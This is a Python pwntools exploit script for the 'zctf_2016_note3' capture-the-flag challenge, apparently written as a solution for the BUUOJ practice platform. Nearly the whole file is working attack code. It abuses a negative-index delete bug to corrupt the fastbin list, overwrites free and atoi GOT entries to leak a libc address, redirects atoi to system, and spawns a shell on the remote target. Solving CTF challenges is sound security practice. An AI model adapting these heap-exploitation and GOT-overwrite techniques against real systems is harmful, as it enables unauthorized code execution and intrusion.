# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './zctf_2016_note3'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc/libc-2.23.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26782'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('>',num)

def add(size,content):
    cmd(1)
    sla("(less than 1024)",size)
    sla("content:",content)

def edit(idx,content):
    cmd(3)
    sla("id of the note:",idx)
    sla("content:",content)

def delete(idx):
    cmd(4)
    sla("id of the note:",idx)

ptrlist = 0x00000000006020C0
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
atoi_got = elf.got["atoi"]
free_got = elf.got["free"]


add(0x68,"a")
add(0x68,"b")

delete(0)

delete(0x8000000000000000 - 0x10000000000000000)
payload = p64(ptrlist  - 0x13)
edit(1,payload)
add(0x68,"c")
add(0x8,"b")
add(0x8,"b")

payload = "\x00"*3  + p64(0) + p64(atoi_got) + p64(free_got) + p64(atoi_got)
add(0x68,payload)

#dbg()

edit(1,p32(puts_plt)+"\x00"*2 )
#dbg()
delete(0)
atoi_addr = l64()
libc.address =  atoi_addr - libc.sym["atoi"]
system = libc.sym["system"]

edit(2,p64(system)[:-1])
lg("system",system)

cmd("sh\x00")


p.interactive()

'''
@File    :   zctf_2016_note3.py
@Time    :   2021/07/23 22:09:44
@Author  :   Niyah 
'''